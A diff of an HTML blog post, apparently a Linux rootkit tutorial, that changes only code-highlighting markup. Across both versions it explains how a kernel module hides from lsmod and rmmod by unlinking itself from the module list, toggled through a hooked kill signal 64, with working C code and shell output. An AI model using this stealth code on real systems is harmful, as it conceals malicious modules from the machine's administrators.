@@ -173,137 +173,137 @@ $ lsmod | grep rootkit rootkit 16384 0 Pretty obvious, right?" />
 
   <div class="post-content"><div>
         <p>So far, we&rsquo;ve seen how hooking both syscalls and regular functions can be put to good use. But, seeing as how this is a series on rootkits, we should really be making some considerations on <em>stealth</em>. If you&rsquo;ve been following along, then once you&rsquo;d loaded any of the previous rootkits, it&rsquo;s presence would have been revealed by simply examining the output of <code>lsmod</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ lsmod | grep rootkit
-rootkit                <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span>
-</code></pre></div><p>Pretty obvious, right? But, I hear you say, this is a userspace tool requesting information from the kernel! Surely we can manipulate this to ignore our little kernel module?! If that was you, then you&rsquo;d be absolutely right.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ lsmod | grep rootkit
+</span></span><span style="display:flex;"><span>rootkit                <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><p>Pretty obvious, right? But, I hear you say, this is a userspace tool requesting information from the kernel! Surely we can manipulate this to ignore our little kernel module?! If that was you, then you&rsquo;d be absolutely right.</p>
 <h1 id="linked-lists-in-the-kernel">Linked Lists in the Kernel<a href="#linked-lists-in-the-kernel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Okay, computer-sciencey section inbound! If you&rsquo;re already comfortable with the idea of linked lists, then you&rsquo;re probably safe skipping down a couple of paragraphs.</p>
 <p>Linked lists are a way of keeping track of several instances of the same object. The best way to understand them is probably by example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> my_object {
-    <span style="color:#66d9ef">int</span> value;
-    <span style="color:#66d9ef">struct</span> my_object <span style="color:#f92672">*</span>next, <span style="color:#f92672">*</span>prev;
-}
-</code></pre></div><p>If this is the first time you&rsquo;ve seen something like this, give it a second read - if it looks a little weird, that&rsquo;s because it <em>is</em> a little weird! The definition of the <code>my_object</code> struct is recursive, but C still makes sense of it. The reason we call it a <em>linked</em> list is because each entry in the list contains pointers to both the next and previous entries. Each item in the list has no idea where it is in the grand scheme of things, but only knows who is in front and who is behind.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> my_object {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> value;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> my_object <span style="color:#f92672">*</span>next, <span style="color:#f92672">*</span>prev;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If this is the first time you&rsquo;ve seen something like this, give it a second read - if it looks a little weird, that&rsquo;s because it <em>is</em> a little weird! The definition of the <code>my_object</code> struct is recursive, but C still makes sense of it. The reason we call it a <em>linked</em> list is because each entry in the list contains pointers to both the next and previous entries. Each item in the list has no idea where it is in the grand scheme of things, but only knows who is in front and who is behind.</p>
 <p>A very simple linked list might loook like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> my_object entry1, entry2, entry3;
-
-entry1.prev <span style="color:#f92672">=</span> NULL;
-entry1.next <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry2;
-
-entry2.prev <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry1;
-entry2.next <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry3;
-
-entry3.prev <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry2;
-entry3.next <span style="color:#f92672">=</span> NULL;
-</code></pre></div><p>The reason we do this is so that we don&rsquo;t have to keep an index somewhere with all the list entries! Each item simply has to know what&rsquo;s next and what&rsquo;s previous to them (and leave the pointer as <code>NULL</code> if they are first/last). This means that we can add/remove/insert a new item simply by modifying a couple of <code>next</code> and <code>prev</code> pointers - without caring about whether we&rsquo;ve got enough room in memory or having to resize arrays.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> my_object entry1, entry2, entry3;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>entry1.prev <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>entry1.next <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry2;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>entry2.prev <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry1;
+</span></span><span style="display:flex;"><span>entry2.next <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry3;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>entry3.prev <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>entry2;
+</span></span><span style="display:flex;"><span>entry3.next <span style="color:#f92672">=</span> NULL;
+</span></span></code></pre></div><p>The reason we do this is so that we don&rsquo;t have to keep an index somewhere with all the list entries! Each item simply has to know what&rsquo;s next and what&rsquo;s previous to them (and leave the pointer as <code>NULL</code> if they are first/last). This means that we can add/remove/insert a new item simply by modifying a couple of <code>next</code> and <code>prev</code> pointers - without caring about whether we&rsquo;ve got enough room in memory or having to resize arrays.</p>
 <p>The kernel makes <em>heavy</em> use of linked lists. Taking a look at <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/module.h#L360"><code>include/linux/types.h</code></a>, we see:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> list_head {
-    <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>next, <span style="color:#f92672">*</span>prev;
-};
-</code></pre></div><p>This is the same as how we defined the <code>my_object</code> struct further up! We also have some pretty simple <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/list.h#L84"><code>list_add()</code></a> and <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/list.h#L144"><code>list_del</code></a> functions that we&rsquo;ll be using later on too. They do exactly what you might think - they add and remove items from linked lists!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> list_head {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>next, <span style="color:#f92672">*</span>prev;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>This is the same as how we defined the <code>my_object</code> struct further up! We also have some pretty simple <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/list.h#L84"><code>list_add()</code></a> and <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/list.h#L144"><code>list_del</code></a> functions that we&rsquo;ll be using later on too. They do exactly what you might think - they add and remove items from linked lists!</p>
 <blockquote>
 <p>Note that in the snippet above from the kernel source, there is no <code>val</code> entry or similar in the struct. This because, on the scale of the entire kernel, it&rsquo;s easier and more manageable to include the <code>list_head</code> struct as a field within another struct which holds the objects that we&rsquo;re linking together. Structs within structs!</p>
 </blockquote>
 <h1 id="keeping-track-of-modules-within-the-kernel">Keeping track of modules within the kernel<a href="#keeping-track-of-modules-within-the-kernel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Every kernel module that gets loaded has a <code>THIS_MODULE</code> object setup for it and made available. We can see this by looking at <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/export.h#L16"><code>include/linux/export.h</code></a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#ifdef MODULE
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">struct</span> module __this_module;
-<span style="color:#75715e">#define THIS_MODULE (&amp;__this_module)
-</span><span style="color:#75715e">#else
-</span><span style="color:#75715e">#define THIS_MODULE ((struct module *)0)
-</span><span style="color:#75715e">#endif
-</span></code></pre></div><p>Either way, <code>THIS_MODULE</code> gets defined as a pointer to a <code>module</code> struct. Let&rsquo;s take a look at that in <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/module.h#L360"><code>include/linux/module.h</code></a></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> module {
-    <span style="color:#66d9ef">enum</span> module_state state;
-
-    <span style="color:#75715e">/* Member of list of modules */</span>
-    <span style="color:#66d9ef">struct</span> list_head list;
-
-    <span style="color:#75715e">/* Unique handle for this module */</span>
-    <span style="color:#66d9ef">char</span> name[MODULE_NAME_LEN];
-
-    <span style="color:#75715e">/* More stuff we aren&#39;t interested in... */</span>
-};
-</code></pre></div><p>Here we see that we have the <code>list_head</code> struct in there which means that we have a linked list! Indeed, in our kernel module, we could find out which module(s) are ahead of/behind us in the list by looking at the pointers to the <code>next</code> and <code>prev</code> modules. As a concrete example, try this <a href="https://gist.github.com/xcellerator/d3a75b0e20d7bf0cab0c521838116ac2">simple module</a> uses the <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/list.h#L510"><code>list_entry()</code></a> function. When we load it, we see (on my system):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo insmod rootkit.ko
-$ dmesg
-<span style="color:#f92672">[</span>12956.924033<span style="color:#f92672">]</span> rootkit: Loaded &gt;:-<span style="color:#f92672">)</span>
-<span style="color:#f92672">[</span>12956.924034<span style="color:#f92672">]</span> rootkit: next kernel module <span style="color:#f92672">=</span> ufs
-<span style="color:#f92672">[</span>12956.924034<span style="color:#f92672">]</span> rootkit: prev kernel module <span style="color:#f92672">=</span>
-</code></pre></div><p>Why is the <code>prev</code> module name empty? Simply because <code>rootkit</code> is the first module in the list! Checking the output of <code>lsmod</code> (which loops through loaded modules in the order that they appear in the linked list), we can see that this is indeed the case:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ lsmod | head -n <span style="color:#ae81ff">5</span>
-Module                  Size  Used by
-rootkit                <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span>
-ufs                    <span style="color:#ae81ff">81920</span>  <span style="color:#ae81ff">0</span>
-qnx4                   <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span>
-hfsplus               <span style="color:#ae81ff">110592</span>  <span style="color:#ae81ff">0</span>
-</code></pre></div><h1 id="writing-the-kernel-module">Writing the Kernel Module<a href="#writing-the-kernel-module" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#ifdef MODULE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">struct</span> module __this_module;
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define THIS_MODULE (&amp;__this_module)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define THIS_MODULE ((struct module *)0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span></code></pre></div><p>Either way, <code>THIS_MODULE</code> gets defined as a pointer to a <code>module</code> struct. Let&rsquo;s take a look at that in <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/module.h#L360"><code>include/linux/module.h</code></a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> module {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">enum</span> module_state state;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Member of list of modules */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> list_head list;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Unique handle for this module */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> name[MODULE_NAME_LEN];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* More stuff we aren&#39;t interested in... */</span>
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Here we see that we have the <code>list_head</code> struct in there which means that we have a linked list! Indeed, in our kernel module, we could find out which module(s) are ahead of/behind us in the list by looking at the pointers to the <code>next</code> and <code>prev</code> modules. As a concrete example, try this <a href="https://gist.github.com/xcellerator/d3a75b0e20d7bf0cab0c521838116ac2">simple module</a> uses the <a href="https://github.com/torvalds/linux/blob/729e3d091984487f7aa1ebfabfe594e5b317ed0f/include/linux/list.h#L510"><code>list_entry()</code></a> function. When we load it, we see (on my system):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo insmod rootkit.ko
+</span></span><span style="display:flex;"><span>$ dmesg
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12956.924033<span style="color:#f92672">]</span> rootkit: Loaded &gt;:-<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12956.924034<span style="color:#f92672">]</span> rootkit: next kernel module <span style="color:#f92672">=</span> ufs
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>12956.924034<span style="color:#f92672">]</span> rootkit: prev kernel module <span style="color:#f92672">=</span>
+</span></span></code></pre></div><p>Why is the <code>prev</code> module name empty? Simply because <code>rootkit</code> is the first module in the list! Checking the output of <code>lsmod</code> (which loops through loaded modules in the order that they appear in the linked list), we can see that this is indeed the case:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ lsmod | head -n <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>Module                  Size  Used by
+</span></span><span style="display:flex;"><span>rootkit                <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>ufs                    <span style="color:#ae81ff">81920</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>qnx4                   <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>hfsplus               <span style="color:#ae81ff">110592</span>  <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><h1 id="writing-the-kernel-module">Writing the Kernel Module<a href="#writing-the-kernel-module" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Armed with this knowledge, we can start to put our rootkit together. Using the same technique as in <a href="../linux_rootkits_03/">Part 3</a>, we are going to hook <code>sys_kill()</code> so that we can send bogus <code>64</code> signals to toggle the module being hidden or revealed. This functionality is going to encompass two new functions that we need to write; appropriately named <code>hideme()</code> and <code>showme()</code>.</p>
 <p>First off, the syscall hook (as usual, I&rsquo;m only going to describe the <code>pt_regs</code> version of the hook - See <a href="../linux_rootkits_02/">Part 2</a> for more information, or the final completed rootkit <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.2_kill_signalling">here</a>). We&rsquo;re going to use a globally defined <code>hidden</code> variable in order to implement a toggle between hidden and shown (this also means we only have to implement one new signal rather than two!).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">short</span> hidden <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-
-asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_kill</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
-{
-    <span style="color:#66d9ef">void</span> showme(<span style="color:#66d9ef">void</span>);
-    <span style="color:#66d9ef">void</span> hideme(<span style="color:#66d9ef">void</span>);
-
-    <span style="color:#66d9ef">int</span> sig <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
-
-    <span style="color:#66d9ef">if</span> ( (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">&amp;&amp;</span> (hidden <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) )
-    {
-        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: hiding rootkit!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-        hideme();
-        hidden <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-    }
-    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">&amp;&amp;</span> (hidden <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) )
-    {
-        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: revealing rootkit!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-        showme();
-        hidden <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-    }
-    <span style="color:#66d9ef">else</span>
-        <span style="color:#66d9ef">return</span> orig_kill(regs);
-}
-</code></pre></div><p>If you&rsquo;ve been following along with the other posts in this series, then hopefully this snippet is pretty straightforward for you. As usual, the guts of this rootkit doesn&rsquo;t lie in the hook itself, but in the <code>showme()</code> and <code>hideme()</code> functions. Because we start off &ldquo;revealed&rdquo;, <code>hideme()</code> will always get called before <code>showme()</code>, so let&rsquo;s look at this first.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">short</span> hidden <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_kill</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> showme(<span style="color:#66d9ef">void</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> hideme(<span style="color:#66d9ef">void</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sig <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">&amp;&amp;</span> (hidden <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: hiding rootkit!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        hideme();
+</span></span><span style="display:flex;"><span>        hidden <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>) <span style="color:#f92672">&amp;&amp;</span> (hidden <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: revealing rootkit!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        showme();
+</span></span><span style="display:flex;"><span>        hidden <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> orig_kill(regs);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>If you&rsquo;ve been following along with the other posts in this series, then hopefully this snippet is pretty straightforward for you. As usual, the guts of this rootkit doesn&rsquo;t lie in the hook itself, but in the <code>showme()</code> and <code>hideme()</code> functions. Because we start off &ldquo;revealed&rdquo;, <code>hideme()</code> will always get called before <code>showme()</code>, so let&rsquo;s look at this first.</p>
 <p>We can&rsquo;t just delete our module from the list and be done - otherwise we wouldn&rsquo;t be able to add it back! We have to save the position that we are currently in before removing ourselves so that <code>showme()</code> can put us back in the right place later. To do this, we introduce another global variable, but this time a pointer to a <code>list_head</code> struct that we&rsquo;ll call <code>prev_module</code>. Once we&rsquo;ve saved the <code>list.prev</code> entry to this global pointer, we can go ahead and safely remove ourselves with <code>list_del()</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>prev_module;
-
-<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hideme</span>(<span style="color:#66d9ef">void</span>)
-{
-    prev_module <span style="color:#f92672">=</span> THIS_MODULE<span style="color:#f92672">-&gt;</span>list.prev;
-    list_del(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list);
-}
-</code></pre></div><p>Easy, right? We should thank the kernel developers for making our lives so easy with all these <code>list_</code> macros that are defined in <a href="https://github.com/torvalds/linux/blob/master/include/linux/list.h"><code>include/linux/list.h</code></a>! It&rsquo;s worth noting that <code>THIS_MODULE</code> is still in memory - all we&rsquo;re doing is rigging the pointers in the linked list to skip over it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> list_head <span style="color:#f92672">*</span>prev_module;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hideme</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    prev_module <span style="color:#f92672">=</span> THIS_MODULE<span style="color:#f92672">-&gt;</span>list.prev;
+</span></span><span style="display:flex;"><span>    list_del(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Easy, right? We should thank the kernel developers for making our lives so easy with all these <code>list_</code> macros that are defined in <a href="https://github.com/torvalds/linux/blob/master/include/linux/list.h"><code>include/linux/list.h</code></a>! It&rsquo;s worth noting that <code>THIS_MODULE</code> is still in memory - all we&rsquo;re doing is rigging the pointers in the linked list to skip over it.</p>
 <p>With this in hand, <code>showme()</code> is even simpler. Because we&rsquo;ve already saved <code>prev_module</code>, it&rsquo;s as simple as using <code>list_add()</code> to slot ourselves back in:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">showme</span>(<span style="color:#66d9ef">void</span>)
-{
-    list_add(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list, prev_module);
-}
-</code></pre></div><h1 id="putting-it-all-together">Putting it all together<a href="#putting-it-all-together" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">showme</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    list_add(<span style="color:#f92672">&amp;</span>THIS_MODULE<span style="color:#f92672">-&gt;</span>list, prev_module);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="putting-it-all-together">Putting it all together<a href="#putting-it-all-together" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>If you&rsquo;ve been following along yourself, then now is a good time to finish up the syscall hook with ftrace and the other declaration of <code>hook_kill()</code> (not using <code>pt_regs</code>). Alternatively, you can find the working source code, as always, on the <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/master/3_RootkitTechniques/3.2_kill_signalling/">repo</a>. Once you&rsquo;ve built the module and loaded it, take a look at <code>lsmod</code> again and note that <code>rootkit</code> is in there:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ lsmod | grep rootkit
-rootkit                <span style="color:#ae81ff">16384</span>  <span style="color:#ae81ff">0</span>
-</code></pre></div><p>Now go ahead and send signal <code>64</code> to any pid and check again:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kill -64 <span style="color:#ae81ff">1</span>
-$ lsmod | grep rootkit
-$
-</code></pre></div><p>Nothing! We can check the output of <code>dmesg</code> to see that our module is still functioning:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ dmesg
-<span style="color:#f92672">[</span>15107.466554<span style="color:#f92672">]</span> rootkit: Loaded &gt;:-<span style="color:#f92672">)</span>
-<span style="color:#f92672">[</span>15109.982025<span style="color:#f92672">]</span> rootkit: hiding rootkit kernel module...
-</code></pre></div><p>What if we try to unload the module?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo rmmod rootkit
-rmmod: ERROR: ../libkmod/libkmod-module.c:799 kmod_module_remove_module<span style="color:#f92672">()</span> could not remove <span style="color:#e6db74">&#39;rootkit&#39;</span>: No such file or directory
-rmmod: ERROR: could not remove module rootkit: No such file or directory
-</code></pre></div><p>It can&rsquo;t find it! This is because <code>rmmod</code> loops through every item in the linked list of modules looking for a <code>name</code> that matches the one we supplied. Because we aren&rsquo;t in the list, it can&rsquo;t find us! Sending signal <code>64</code> somewhere again brings us back and will let us unload the module.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#960050;background-color:#1e0010">$</span> kill <span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#ae81ff">1</span>
-<span style="color:#960050;background-color:#1e0010">$</span> sudo rmmod rootkit
-<span style="color:#960050;background-color:#1e0010">$</span> dmesg
-[<span style="color:#ae81ff">15107.466554</span>] rootkit: Loaded <span style="color:#f92672">&gt;:-</span>)
-[<span style="color:#ae81ff">15109.982025</span>] rootkit: hiding rootkit kernel module...
-[<span style="color:#ae81ff">15252.183065</span>] rootkit: revealing rootkit kernel module...
-[<span style="color:#ae81ff">15255.439374</span>] rootkit: Unloaded :<span style="color:#f92672">-</span>(
